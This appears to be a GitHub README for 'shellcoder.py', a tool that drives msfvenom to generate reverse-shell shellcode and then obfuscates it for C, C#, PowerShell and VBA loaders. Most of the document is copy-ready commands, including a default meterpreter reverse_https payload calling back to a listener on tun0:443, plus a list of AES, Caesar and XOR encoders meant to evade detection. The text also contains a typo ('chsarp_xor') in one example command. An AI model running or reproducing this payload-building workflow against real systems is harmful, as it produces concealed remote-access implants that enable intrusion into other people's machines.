# shellcoder.py
A tool I wrote to ease the process of shellcode generation and obfuscation!

## Getting Started
This tool has some dependencies that may need to be installed. It was written and tested on Kali Linux 2021.4 so most of the dependencies are already pre-installed. In the event you are using an older version or non-Kali install, you can get started by running the following commands:
```bash
sudo python3 -m pip install -r requirements.txt
```
This tool is depenedent on msfvenom to generate raw shellcode files. If the Metasploit Framework is not installed on your system, here are the commands you will need to run to install it:
```bash
wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
```
```bash
sudo chmod +x ./metasploit-latest-linux-x64-installer.run
```
```bash
sudo ./metasploit-latest-linux-x64-installer.run
```
## Generating shellcode
One of the main reasons I developed this tool was to automate the process of generating shellcode for both Windows and Linux using msfvenom. To generate shellcode you can run shellcoder.py with the -l flag to set the listening host, the -p flag to set the listening port, the -t flag to set the payload type, and most importantly the -g or --generate flag. Alternatively, you can can just run shellcoder.py with the -g or --generate flag and it will use the following default values:

- PAYLOAD=windows/x64/meterpreter/reverse_https
- LHOST=tun0
- LPORT=443
- OUTFILE=/tmp/raw_sc

Some example commands that can be used to generate shellcode with shellcoder.py are as follows:
```bash
python3 shellcoder.py -l tun0 -p 443 -t windows/x64/meterpreter/reverse_https -o raw_sc --generate
```

<p align="center">
<a href="/img/gen1.png"><img src="/img/gen1.png"></a>
 </p>
 
```bash
python3 shellcoder.py --generate
```

<p align="center">
<a href="/img/gen2.png"><img src="/img/gen2.png"></a>
 </p>

 ## Encoding shellcode
 There are a couple options to can use to encode shellcode in different formats. Here is a list of formats the shellcode can be encoded with:

- clang_aes
- clang_caesar
- clang_xor
- csharp_aes
- csharp_caesar
- csharp_xor
- ps1_aes
- ps1_caesar
- ps1_xor
- vba_aes
- vba_caesar
- vba_xor

To generate shellcode with shellcoder.py, you can supply the -e flag with the encoder type. Optionally you can specify the input and output files with the -i and -o flags, respectively. If you do not specify an input file, shellcoder.py will look for the raw shellcode file located at /tmp/raw_sc. Here are some example commands that can be used to encode your shellcode:
```bash
python3 shellcoder.py -e chsarp_xor -i raw_sc -o enc_sc.txt
```

<p align="center">
<a href="/img/enc1.png"><img src="/img/enc2.png"></a>
 </p>
 
 ```bash
python3 shellcoder.py -e csharp_xor -i raw_sc
 ```
 
 <p align="center">
<a href="/img/enc2.png"><img src="/img/enc2.png"></a>
 </p>
 
 ```bash
python3 shellcoder.py -e csharp_xor
 ```
 
  <p align="center">
<a href="/img/enc3.png"><img src="/img/enc3.png"></a>
 </p>

 These are just a few examples of how raw shellcode files can be encoded. You can see the help page for more options with the following command:
```bash
python3 shellcoder.py -h
```

<p align="center">
<a href="/img/help.png"><img src="/img/help.png"></a>
 </p>
